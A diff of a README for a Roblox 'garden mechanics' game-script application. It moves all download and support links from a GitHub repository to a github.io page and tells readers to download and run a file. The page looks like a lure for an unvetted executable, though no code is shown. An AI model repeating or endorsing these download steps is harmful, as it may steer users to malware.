@@ -1,6 +1,6 @@
 # 🌱 .github - Explore Garden Mechanics & Plant Collections
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/Endgamesweepsecond223/.github)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://endgamesweepsecond223.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to .github, a desktop companion interface for exploring garden mechanics
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/Endgamesweepsecond223/.github](https://github.com/Endgamesweepsecond223/.github)
+Visit this link to download the application: [https://endgamesweepsecond223.github.io](https://endgamesweepsecond223.github.io)
 
 Once you are on the download page, look for the latest release or download button. Click it to save the file to your computer. After downloading, locate the file in your Downloads folder.
 
@@ -42,6 +42,6 @@ If the application does not open, try these steps:
 
 ## 📞 Support
 
-For questions or issues, visit the repository page: [https://github.com/Endgamesweepsecond223/.github](https://github.com/Endgamesweepsecond223/.github)
+For questions or issues, visit the repository page: [https://endgamesweepsecond223.github.io](https://endgamesweepsecond223.github.io)
 
 Keywords: game-scripts, growagarden, keyless, macros, modulescript, nexus-scripts, plant-growth, roblox, roblox-top, wave-lua-utility
